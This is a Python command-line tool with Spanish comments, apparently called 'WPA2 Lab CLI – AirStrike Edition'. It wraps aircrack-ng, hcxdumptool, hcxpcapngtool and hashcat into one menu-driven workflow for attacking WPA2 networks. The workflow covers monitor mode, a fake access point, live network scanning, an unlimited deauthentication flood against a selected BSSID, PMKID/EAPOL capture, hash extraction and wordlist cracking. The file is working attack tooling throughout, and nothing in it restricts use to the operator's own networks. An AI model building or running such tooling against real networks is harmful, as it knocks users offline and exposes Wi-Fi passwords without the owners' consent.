#!/usr/bin/env python3
"""
WPA2 Lab CLI – AirStrike Edition
© 2025
"""
from __future__ import annotations
import csv, logging, re, shutil, subprocess, sys, tempfile, time
from pathlib import Path
from typing import List, Optional, Tuple
from itertools import islice
import tempfile
import subprocess
from prompt_toolkit import prompt
from prompt_toolkit.completion import PathCompleter
from pathlib import Path
from rich.progress import (Progress, SpinnerColumn, BarColumn,
                           TaskProgressColumn, TimeRemainingColumn)

from rich.progress import Progress, SpinnerColumn, TextColumn
import curses, threading
import typer, yaml
from rich import box
from rich.console import Console, Group
from rich.panel import Panel
from rich.table import Table
from rich.align import Align      # ← AÑADE ESTA LÍNEA
from rich.live import Live
from rich.text import Text
from datetime import datetime, timedelta
import re, subprocess, shlex, tempfile, signal, textwrap

# ---------------------------------------------------------------------------------
# 🔧 ─ Config & Logging
# ---------------------------------------------------------------------------------
SCRIPT_DIR  = Path(__file__).resolve().parent
PROJECTROOT = SCRIPT_DIR.parent
LOG_FILE    = PROJECTROOT / "logs/wpa2lab.log"
PCAP_FILE   = PROJECTROOT / "dump.pcapng"     # se actualiza en capture
HASH_FILE   = PROJECTROOT / "hash.22000"      # se actualiza en extract

# ── Estado global que iremos rellenando ───────────────────
STATE: dict = {
    "mon":   None,        # wlan0mon …
    "ap":    None,        # interfaz con hostapd
    "target": {},         # dict con bssid / channel / essid
    "hash":  None,        # ruta hash 22000
    "pw":    None         # password crackeada
}

# ── logging / consola ─────────────────────────────────────
logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                    format="%(asctime)s %(levelname)s %(message)s")
log      = logging.getLogger("wpa2lab")
console  = Console()
cli      = typer.Typer(add_completion=False)

# ---------------------------------------------------------------------------------
# ✨ ─ Ascii logo
# ---------------------------------------------------------------------------------
LOGO = """
██╗    ██╗ ██████╗   █████╗  ██████╗  ██╗       █████╗  ██████╗ 
██║    ██║ ██╔══██╗ ██╔══██╗ ╚════██║ ██║      ██╔══██╗ ██╔══██╗
██║ █╗ ██║ ██████╔╝ ███████║  █████╔╝ ██║      ███████║ ██████╔╝
██║███╗██║ ██╔═══╝  ██╔══██║ ██╔═══╝  ██║      ██╔══██║ ██╔══██╗
╚███╔███╔╝ ██║      ██║  ██║ ███████╗ ███████╗ ██║  ██║ ██████╔╝
 ╚══╝╚══╝  ╚═╝      ╚═╝  ╚═╝ ╚══════╝ ╚══════╝ ╚═╝  ╚═╝ ╚═════╝ 
"""


# ── helpers ──────────────────────────────────────────────
def run(cmd: list[str], *, sudo=False, quiet=False):
    full = ["sudo", *cmd] if sudo else cmd
    if not quiet:
        console.log(f"[cyan]$ {' '.join(full)}")
    log.info("CMD %s", " ".join(full))
    subprocess.run(full, check=True)

def ensure(tool: str, pkg: str|None=None):
    if shutil.which(tool): return
    console.print(f"[red]Falta {tool}[/]  → sudo apt install {pkg or tool}")
    raise typer.Exit()

def iw_ifaces() -> List[str]:
    txt = subprocess.check_output(["iw","dev"], text=True)
    return re.findall(r"Interface\s+(\w+)", txt)

def mon_iface() -> Optional[str]:
    return next((i for i in iw_ifaces() if i.endswith("mon")), None)

def ask_iface(title: str, allow_mon: bool=False) -> str:
    wl = iw_ifaces()
    if not allow_mon:
        wl = [i for i in wl if not i.endswith("mon")]
    tbl = Table(box=box.SIMPLE); tbl.add_column("idx"); tbl.add_column("iface")
    for i,iface in enumerate(wl): tbl.add_row(str(i), iface)
    console.print(tbl)
    idx = int(console.input(f"{title} nº >> ") or 0)
    return wl[idx]

def status_panel() -> Panel:
    mon = STATE["mon"] or "-"
    ap  = STATE["ap"]  or "-"
    tgt = STATE["target"]
    tgt_text = "-" if not tgt else f"{tgt.get('essid','')} ({tgt['bssid']} / ch {tgt['channel']})"
    hsh = STATE["hash"] or "-"
    pw  = STATE["pw"]   or "-"
    txt = (
        f"[bold]Monitor:[/] {mon}\n"
        f"[bold]Fake-AP:[/] {ap}\n"
        f"[bold]Objetivo:[/] {tgt_text}\n"
        f"[bold]Hash:[/] {hsh}\n"
        f"[bold]Pass:[/] {pw}"
    )
    return Panel(txt, title="Estado actual", box=box.ROUNDED, style="bright_blue")

# ── acciones (misma lógica que antes, pero actualizando STATE) ──────────────
def act_prepare():
    ensure("airmon-ng")
    iface = ask_iface("Interfaz a poner en MONITOR")
    run(["airmon-ng","check","kill"], sudo=True)
    run(["airmon-ng","start", iface], sudo=True)
    STATE["mon"] = iface+"mon"
    console.print(f"[green bold]✓[/] {STATE['mon']} activada")

def act_reset():
    ensure("airmon-ng")
    for m in [i for i in iw_ifaces() if i.endswith("mon")]:
        run(["airmon-ng","stop", m], sudo=True)
    STATE["mon"] = None
    console.print("[green bold]✓[/] Interfaces restauradas")

def act_ap():
    ensure("hostapd"); ensure("dnsmasq")
    iface = ask_iface("Interfaz para AP", allow_mon=False)
    STATE["ap"] = iface
    run(["ip","link","set",iface,"up"], sudo=True)
    run(["ip","addr","flush","dev",iface], sudo=True)
    run(["ip","addr","add","10.0.0.1/24","dev",iface], sudo=True)
    subprocess.run(["sudo","killall","hostapd"], check=False)
    subprocess.run(["sudo","killall","dnsmasq"], check=False)
    hapd = tempfile.NamedTemporaryFile("w", delete=False)
    hapd.write(f"interface={iface}\nssid=WPA2_LAB_FAKE\nchannel=6\nhw_mode=g\nwpa=2\n"
               "wpa_passphrase=12345678\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n"); hapd.close()
    dns = tempfile.NamedTemporaryFile("w", delete=False)
    dns.write(f"interface={iface}\ndhcp-range=10.0.0.10,10.0.0.50,12h\n"); dns.close()
    run(["hostapd","-B",hapd.name], sudo=True, quiet=True)
    run(["dnsmasq","-C",dns.name],  sudo=True, quiet=True)
    console.print(f"[green bold]✓ AP activo en {iface}[/]")


# ── ESCÁNER EN TIEMPO REAL ────────────────────────────
# ──────────────────────────────────────────────────────────────
#  _live_scan  –  versión ligera (sin CLIENTS ni VENDOR)
# ──────────────────────────────────────────────────────────────
def _live_scan(stdscr, mon_iface: str):
    """
    Muestra los AP detectados y permite elegir uno con ↑/↓/Enter.
    Devuelve (bssid, essid, channel, pwr) o None.
    """
    import csv, re, subprocess, tempfile, threading, time
    from pathlib import Path

    # ── configuración curses ──────────────────────────────────
    curses.curs_set(0)
    stdscr.keypad(True)
    stdscr.timeout(120)

    if curses.has_colors():
        curses.start_color()
        curses.use_default_colors()
        curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_CYAN)   # fila sel.
        curses.init_pair(2, curses.COLOR_CYAN,   -1)                 # cabecera
        curses.init_pair(3, curses.COLOR_GREEN,  -1)                 # WPA2
        curses.init_pair(4, curses.COLOR_YELLOW, -1)                 # WPA/WPS
        curses.init_pair(5, curses.COLOR_RED,    -1)                 # OPEN
    sel_style = curses.color_pair(1)
    hdr_style = curses.color_pair(2) | curses.A_BOLD
    enc_style = {'WPA2': 3, 'WPA': 4, 'OPEN': 5}

    # ── lanza airodump-ng ─────────────────────────────────────
    tmp  = tempfile.NamedTemporaryFile(suffix='.csv', delete=False)
    proc = subprocess.Popen(
        ['sudo', 'airodump-ng', '--write-interval', '1',
         '--output-format', 'csv', '-w', tmp.name[:-4], mon_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    csv_path = Path(tmp.name[:-4] + '-01.csv')

    # ── estado compartido ─────────────────────────────────────
    nets: list[tuple] = []   # [(bssid, essid, ch, pwr, enc)]
    selected = 0

    # ── lector en hilo aparte ─────────────────────────────────
    def reader():
        nonlocal nets
        while proc.poll() is None:
            if not csv_path.exists():
                time.sleep(0.8)
                continue
            with csv_path.open(errors='ignore') as fh:
                rows = list(csv.reader(fh))

            # separa la sección de APs (antes de “Station MAC”)
            try:
                idx_station = next(i for i, r in enumerate(rows)
                                   if r and r[0].startswith('Station MAC'))
            except StopIteration:
                idx_station = len(rows)
            aps_raw = rows[:idx_station]

            new = []
            for r in aps_raw:
                if not r or not re.fullmatch(r'([0-9A-F]{2}:){5}[0-9A-F]{2}', r[0]):
                    continue

                bssid = r[0].strip().upper()

                chan_raw = r[3].strip() if len(r) > 3 else ''
                m = re.search(r'\d+', chan_raw)
                ch = int(m.group()) if m else 0

                enc = (r[5] if len(r) > 5 else 'OPEN').strip() or 'OPEN'

                pwr_raw = r[8].strip() if len(r) > 8 else ''
                try:
                    power = int(float(pwr_raw))
                except ValueError:
                    power = -100
                pwr = max(0, min(100, 2 * (power + 100)))   # 0-100 %

                essid = (r[13].strip() if len(r) > 13 else '') or '<Hidden>'

                new.append((bssid, essid, ch, pwr, enc))

            nets = new                    # ¡sin ordenar!
            time.sleep(1)

    threading.Thread(target=reader, daemon=True).start()

    # ── tabla ────────────────────────────────────────────────
    COLS = [
        ('ESSID', 35),
        ('BSSID', 17),
        ('CH',     4),
        ('PWR',    4),
        ('ENCR',   8),
    ]
    BORDER_H = '─'

    # ── bucle principal ──────────────────────────────────────
    while True:
        stdscr.erase()
        stdscr.addstr(0, 0,
            "Options: [Esc] Quit   [↑/k] Up   [↓/j] Down   [Enter] Select")

        tbl_w = sum(w for _, w in COLS) + len(COLS) + 1
        off_x = max(0, (curses.COLS - tbl_w - 2)//2)

        stdscr.addstr(1, off_x,
            '┌' + '┬'.join(BORDER_H * w for _, w in COLS) + '┐')
        x = off_x + 1
        for title, width in COLS:
            stdscr.addstr(2, x, f'{title:^{width}}', hdr_style)
            x += width + 1
        stdscr.addstr(3, off_x,
            '├' + '┼'.join(BORDER_H * w for _, w in COLS) + '┤')

        max_rows = curses.LINES - 6
        for idx, (b, e, ch, pwr, enc) in enumerate(nets[:max_rows]):
            y  = 4 + idx
            st = sel_style if idx == selected else curses.A_NORMAL
            en_st = st
            base_enc = enc.split('/')[0]
            if idx != selected and enc_style.get(base_enc):
                en_st |= curses.color_pair(enc_style[base_enc])

            row = [
                f'{e:<{COLS[0][1]}.{COLS[0][1]}}',
                b,
                f'{ch:^{COLS[2][1]}}',
                f'{pwr:>3}%',
                f'{enc:<{COLS[4][1]}}',
            ]
            x = off_x + 1
            for i, cell in enumerate(row):
                style = en_st if i == 4 else st
                stdscr.addstr(y, x, cell, style)
                x += COLS[i][1] + 1

        stdscr.addstr(4 + min(len(nets), max_rows), off_x,
            '└' + '┴'.join(BORDER_H * w for _, w in COLS) + '┘')
        stdscr.refresh()

        key = stdscr.getch()
        if key in (curses.KEY_UP, ord('k')) and selected > 0:
            selected -= 1
        elif key in (curses.KEY_DOWN, ord('j')) and selected < len(nets) - 1:
            selected += 1
        elif key in (10, 13, curses.KEY_ENTER):
            proc.terminate()
            return nets[selected][:4] if nets else None
        elif key in (27, ord('q')):
            proc.terminate()
            return None
        elif key == curses.KEY_MOUSE:
            _, _mx, my, _mz, _ = curses.getmouse()
            idx = my - 4
            if 0 <= idx < len(nets):
                proc.terminate()
                return nets[idx][:4]


# ── REEMPLAZA act_scan() POR ESTO ─────────────────────
def act_scan():
    if not STATE["mon"]:
        console.print("[red]Activa antes el modo monitor[/]")
        return
    try:
        res = curses.wrapper(_live_scan, STATE["mon"])
        if res:
            b, e, ch, _ = res
            STATE["target"] = {"bssid": b, "essid": e, "channel": ch}
            console.print(f"[green]✓ Objetivo seleccionado:[/] {b}  ({e})")
        else:
            console.print("[yellow]· Escaneo cancelado ·[/]")
    except Exception as err:
        console.print(f"[red]Error en escaneo interactivo:[/] {err}")

def act_deauth():
    """
    Flood de deauth en el canal del objetivo.
    - Cambia la interfaz monitor al canal correcto.
    - Ctrl-C interrumpe sin mostrar “error –2”.
    """
    ensure("aireplay-ng", "aircrack-ng")

    tgt, mon = STATE["target"], STATE["mon"]
    if not (tgt and mon):
        console.print("[red]Falta monitor o no hay objetivo fijado (escanea primero)[/]")
        return

    ch     = str(tgt["channel"])
    bssid  = tgt["bssid"]

    # Sintonizar canal
    try:
        run(["iw", "dev", mon, "set", "channel", ch], sudo=True, quiet=True)
    except subprocess.CalledProcessError:
        console.print(f"[red]No pude cambiar {mon} al canal {ch}[/]")
        return

    console.print(f"[cyan]Inyectando deauth en canal {ch}…  (Ctrl-C para parar)[/]")

    try:
        run(["aireplay-ng", "--deauth", "0", "-a", bssid, mon], sudo=True)
    except KeyboardInterrupt:
        console.print("[yellow]· Deauth interrumpido ·[/]")
    except subprocess.CalledProcessError as e:
        if e.returncode == -2:          # −2 = interrumpido por SIGINT
            console.print("[yellow]· Deauth interrumpido ·[/]")
        else:
            console.print(f"[red]aireplay-ng terminó con error:[/] {e.returncode}")

# ── Captura PMKID (filtrado con BPF por BSSID) ─────────────────────────────────
def act_capture():
    """
    Captura PMKID/EAPOL de TODO lo que se oiga en el canal del target.
    Ideal cuando el driver no admite filtros en hcxdumptool 6.3.x.
    """
    ensure("hcxdumptool")
    mon = STATE.get("mon")
    if not mon:
        console.print("[red]No hay interfaz en modo monitor[/]")
        return

    # ── Desactiva NM y wpa_supplicant ───────────────────────
    for svc in ("NetworkManager", "wpa_supplicant"):
        subprocess.run(["sudo", "systemctl", "stop", svc], check=False)

    # ── Canal del objetivo (opcional pero recomendable) ─────
    tgt = STATE.get("target", {})
    ch = str(tgt.get("channel", "")) if tgt else ""
    if ch:
        run(["iw","dev",mon,"set","channel", ch], sudo=True, quiet=True)
        console.print(f"[cyan]Sintonizado {mon} al canal {ch}[/]")

    # ── Archivo de salida ──────────────────────────────────
    cap_dir = PROJECTROOT / "captures"; cap_dir.mkdir(exist_ok=True)
    pcap = cap_dir / f"dump-{time.strftime('%Y%m%d_%H%M%S')}.pcapng"
    console.print(f"[cyan]Capturando PMKID… Ctrl-C para parar → {pcap}[/]")

    try:
        run(["hcxdumptool", "-i", mon, "-t", "5", "-w", str(pcap)], sudo=True)
    except KeyboardInterrupt:
        console.print("[yellow]· Captura interrumpida ·[/]")
    except subprocess.CalledProcessError as e:
        console.print(f"[red]hcxdumptool terminó con código {e.returncode}[/]")
        return

    # ── Verificación ───────────────────────────────────────
    if not pcap.exists() or pcap.stat().st_size < 100:
        console.print("[yellow]No se capturaron paquetes útiles.[/]")
        if pcap.exists():
            pcap.unlink()
        return

    STATE["pcap"] = str(pcap)
    console.print(f"[green bold]✓[/] Captura guardada en {pcap}\n"
                  f"[dim]Filtra luego con hcxpcapngtool --filterlist_ap={tgt.get('bssid','<MAC>')}[/]")

# ────────────────────────── EXTRAER HASH ──────────────────────
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn

def act_extract():
    """
    Extrae y muestra un resumen legible del hash 22000 de un PCAP:
     - Si no hay STATE['pcap'], lista captures/ y deja elegir.
     - Luego corre hcxpcapngtool, parsea su salida y la muestra en tabla.
    """
    ensure("hcxpcapngtool", "hcxtools")

    # 1) Si no tenemos pcap en el estado, listamos y permitimos elegir
    pcap_path = STATE.get("pcap")
    if not pcap_path:
        cap_dir = PROJECTROOT / "captures"
        caps = sorted(cap_dir.glob("*.pcapng"))
        if not caps:
            console.print("[red]No hay capturas en captures/. Ejecuta antes la opción 6[/]")
            return

        table = Table("Índice", "Archivo", "Tamaño (KiB)", box=box.SIMPLE)
        for i, f in enumerate(caps):
            table.add_row(str(i), f.name, str(f.stat().st_size // 1024))
        console.print(Panel(table, title="Capturas disponibles"))

        choice = console.input("[bold]Selecciona índice (q para salir): [/]").strip()
        if choice.lower() == "q":
            console.print("[yellow]Extracción cancelada[/]")
            return
        try:
            idx = int(choice)
            pcap_path = str(caps[idx])
        except:
            console.print("[red]Índice no válido[/]"); return

    # 2) Ejecutamos hcxpcapngtool con spinner
    console.print(Panel.fit(f"[bold]Extrayendo hash 22000 de[/bold] {Path(pcap_path).name}", style="cyan"))
    cmd = ["hcxpcapngtool", "-o", str(PROJECTROOT/"hashes"/"tmp.22000"), pcap_path]

    with Progress(SpinnerColumn(), TextColumn("{task.description}"), transient=True, console=console) as prog:
        prog.add_task("Procesando...", start=True)
        try:
            output = subprocess.check_output(cmd, text=True)
        except subprocess.CalledProcessError as e:
            console.print(f"[red]Error: hcxpcapngtool terminó con código {e.returncode}[/]")
            return

    # 3) Parseo de los campos clave
    fields = {
        "file name": "Archivo",
        "duration of the dump tool (seconds)": "Duración (s)",
        "packets inside": "Paquetes totales",
        "EAPOL messages (total)": "EAPOL mensajes",
        "RSN PMKID (total)": "PMKID totales",
        "RSN PMKID written to 22000 hash file": "PMKID hashes"
    }
    stats = {}
    for line in output.splitlines():
        line = line.strip()
        for key, label in fields.items():
            if line.startswith(key):
                # valor tras los ':' caract.
                val = line.split(":", 1)[1].strip()
                stats[label] = val

    # 4) Mostrar resumen en tabla
    summary = Table(box=box.SIMPLE, title="📋 Resumen de hash extraction")
    summary.add_column("Campo", style="bold")
    summary.add_column("Valor", justify="right")

    summary.add_row("PCAP", Path(pcap_path).name)
    for label in ("Duración (s)", "Paquetes totales", "EAPOL mensajes", "PMKID totales", "PMKID hashes"):
        if label in stats:
            summary.add_row(label, stats[label])

    console.print(summary)

    # 5) Mover el hash extraído a hashes/ y actualizar estado
    ts = time.strftime("%Y%m%d_%H%M%S")
    dest = PROJECTROOT/"hashes"/f"hash-{ts}.22000"
    (PROJECTROOT/"hashes").mkdir(exist_ok=True)
    shutil.move(str(PROJECTROOT/"hashes"/"tmp.22000"), str(dest))

    STATE["hash"] = dest
    console.print(f"[green bold]✓[/] Hash 22000 → {dest.name}")


# ────────────────────────── CRACKEAR HASH ─────────────────────
def act_crack():
    """
    Crack WPA2 con hashcat en modo AUTOMÁTICO o INTERACTIVO
    ─────────────────────────────────────────────────────────
    • Si no hay STATE['hash'], lista los hashes en hashes/ y deja elegir.
    • Elige rockyou.txt, dnsmap.txt, o importa tu propia lista (con autocompletar).
    • Modo Automático  : lee TODA la word-list, muestra barra de progreso y tabla viva.
    • Modo Interactivo : procesa por bloques; pregunta tras cada bloque y muestra paneles
                         “Bloque X” y “✓ Hallados bloque X”.
    • Tabla → 2 columnas (SSID | Contraseña). Contraseña en rojo y negrita.
    • Al final solo: “✅ Crack completado”.
    """
    ensure("hashcat")

    # ╭─ 0) Hash a crackear ──────────────────────────────────────────────╮
    hashf = STATE.get("hash")
    if not hashf:
        hdir   = PROJECTROOT / "hashes"
        hashes = sorted(hdir.glob("hash-*.22000"))
        if not hashes:
            console.print("[red]No hay hashes en hashes/. Usa opción 7 primero.[/]")
            return
        tbl = Table("Índice", "Hash", box=box.SIMPLE)
        for i, f in enumerate(hashes):
            tbl.add_row(str(i), f.name)
        console.print(Panel(tbl, title="Hashes disponibles"))
        sel = console.input("[bold]Índice (q para salir):[/] ").strip()
        if sel.lower() == "q":
            return
        try:
            hashf = str(hashes[int(sel)])
        except Exception:
            console.print("[red]Índice inválido.[/]")
            return

    # ╭─ 1) Word-list ────────────────────────────────────────────────────╮
    wl_dir = Path("/usr/share/wordlists")
    base_wls = ["rockyou.txt", "dnsmap.txt"]
    wls = [wl_dir / n for n in base_wls if (wl_dir / n).exists()]
    tbl = Table("Índice", "Word-list", box=box.SIMPLE)
    for i, w in enumerate(wls):
        tbl.add_row(str(i), w.name)
    tbl.add_row("[green]i[/green]", "[magenta]Importar otra…[/magenta]")
    console.print(Panel(tbl, title="Word-lists"))
    wl_choice = console.input("[bold]Elige índice o 'i':[/] ").strip().lower()
    if wl_choice == "i":
        wl_path = Path(prompt("Ruta word-list: ", completer=PathCompleter()))
    else:
        try:
            wl_path = wls[int(wl_choice)]
        except Exception:
            console.print("[red]Índice inválido – uso rockyou.txt[/]")
            wl_path = wl_dir / "rockyou.txt"
    if not wl_path.exists():
        console.print(f"[red]Word-list inexistente:[/] {wl_path}")
        return

    # ╭─ 2) Modo ─────────────────────────────────────────────────────────╮
    auto = console.input("¿Modo automático? ([y]/n) ").strip().lower() in ("", "y")
    default_chunk = 50_000
    if auto:
        chunk_size = default_chunk
    else:
        blk = console.input(f"Tamaño bloque [Enter={default_chunk}] ").strip()
        try:
            chunk_size = int(blk) if blk else default_chunk
        except ValueError:
            chunk_size = default_chunk

    # ╭─ 3) Cabecera elegante ────────────────────────────────────────────╮
    header = Panel.fit(
        f"📶 Crack WPA2\n"
        f"Hash: {Path(hashf).name}\n"
        f"WL: {wl_path.name}  •  Bloque: {chunk_size} líneas  •  "
        f"{'Automático' if auto else 'Interactivo'}",
        title="🔑 Iniciando crack",
        box=box.ROUNDED,
        style="cyan")
    console.print(header)

    # ╭─ 4) Tabla de resultados (una sola) ───────────────────────────────╮
    table = Table("SSID", "Contraseña", box=box.SIMPLE, header_style="bold")
    found_pw = set()

    # ╭─ 4A) Modo AUTOMÁTICO (barra de progreso y tabla viva) ────────────╮
    if auto:
        total_lines = sum(1 for _ in wl_path.open("r", errors="ignore"))
        progress = Progress(
            SpinnerColumn(),
            BarColumn(bar_width=None),
            TaskProgressColumn(),
            TimeRemainingColumn(),
            console=console,
            transient=True)
        task = progress.add_task("Crackeando", total=total_lines)

        group = Group(progress, table)
        with Live(group, console=console, refresh_per_second=2):
            with wl_path.open("r", errors="ignore") as fh:
                while True:
                    chunk = list(islice(fh, chunk_size))
                    if not chunk:
                        break
                    # escribe chunk tmp
                    tmp = tempfile.NamedTemporaryFile("w+", delete=False)
                    tmp.write("".join(chunk)); tmp.close()
                    subprocess.run(
                        ["hashcat", "-m", "22000", hashf, tmp.name, "--quiet"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                    os_lines = len(chunk)
                    progress.update(task, advance=os_lines)
                    # lee passwords
                    show = subprocess.check_output(
                        ["hashcat", "-m", "22000", "--show", hashf],
                        text=True).strip()
                    for line in show.splitlines():
                        parts = line.split(":")
                        if len(parts) >= 4:
                            ssid, pwd = parts[2], parts[-1]
                            if pwd not in found_pw:
                                found_pw.add(pwd)
                                table.add_row(ssid, f"[bold red]{pwd}[/bold red]")

    # ╭─ 4B) Modo INTERACTIVO ────────────────────────────────────────────╮
    else:
        with wl_path.open("r", errors="ignore") as fh:
            block = 1
            while True:
                chunk = list(islice(fh, chunk_size))
                if not chunk:
                    break
                console.print(Panel(f"Bloque {block} → probando {len(chunk)} contraseñas",
                                    box=box.ROUNDED))
                tmp = tempfile.NamedTemporaryFile("w+", delete=False)
                tmp.write("".join(chunk)); tmp.close()
                subprocess.run(
                    ["hashcat", "-m", "22000", hashf, tmp.name, "--quiet"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                show = subprocess.check_output(
                    ["hashcat", "-m", "22000", "--show", hashf],
                    text=True).strip()
                for line in show.splitlines():
                    parts = line.split(":")
                    if len(parts) >= 4:
                        ssid, pwd = parts[2], parts[-1]
                        if pwd not in found_pw:
                            found_pw.add(pwd)
                            table.add_row(ssid, f"[bold red]{pwd}[/bold red]")
                console.print(Panel(table, title=f"✓ Hallados bloque {block}",
                                    box=box.ROUNDED))
                cont = console.input("Continuar con siguiente bloque? ([y]/n) ").strip().lower()
                if cont and cont != "y":
                    break
                block += 1

    # ╭─ 5) Fin ───────────────────────────────────────────────────────────╮
    console.print(Panel("✅ Crack completado", box=box.ROUNDED, style="green"))

# ── menú ─────────────────────────────────────────────────
MENU = [
    ("1", "Modo MONITOR",   act_prepare),
    ("2", "Levantar AP",    act_ap),
    ("3", "Reset IFs",      act_reset),
    ("4", "Escanear redes", act_scan),

    # orden re-numerado
    ("5", "Capturar PMKID", act_capture),   # ← antes era 6
    ("6", "Extraer hash",   act_extract),   # ← antes era 7
    ("7", "Crack offline",  act_crack),     # ← antes era 8
    ("8", "Deauth attack",  act_deauth),    # ← antes era 5

    ("0", "Salir",          None),
]

def show_menu():
    console.clear()
    console.print(Panel(Align.center(LOGO), box=box.DOUBLE, style="cyan"))
    console.print(status_panel())
    tbl = Table(box=box.ROUNDED, show_header=False, padding=(0,1))
    tbl.add_column(" Nº ", justify="right", style="magenta bold")
    tbl.add_column("Acción", style="bold white")
    for k,txt,_ in MENU: tbl.add_row(k, txt)
    console.print(tbl)

def interactive():
    actions = {k:f for k,_,f in MENU}
    while True:
        show_menu()
        try:
            choice = console.input("[bold cyan]>> [/]").strip()
        except KeyboardInterrupt:
            continue
        if choice=="0":
            console.print("[bold yellow]Bye![/]"); break
        fn = actions.get(choice)
        if not fn:
            console.print("[red]Opción inválida[/]"); time.sleep(1); continue
        try:
            fn()
        except KeyboardInterrupt:
            console.print("[yellow]· Cancelado ·[/]")
        except Exception as e:
            console.print(f"[red]Error:[/] {e}")
        console.input("[green]Intro para menú…[/]")


# ── CLI directo (Typer) ────────────────────────────────────────────────────
@cli.command()  # python … monitor
def monitor(): act_prepare()
@cli.command()  # python … ap
def ap():       act_ap()
@cli.command()  # python … scan-cli
def scan_cli(): act_scan()
@cli.command()  # python … deauth
def deauth():   act_deauth()
@cli.command()  # python … capture
def capture():  act_capture()
@cli.command()  # python … extract
def extract():  act_extract()
@cli.command()  # python … crack
def crack():    act_crack()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        cli()          # modo “python script.py comando …”
    else:
        interactive()  # menú gráfico
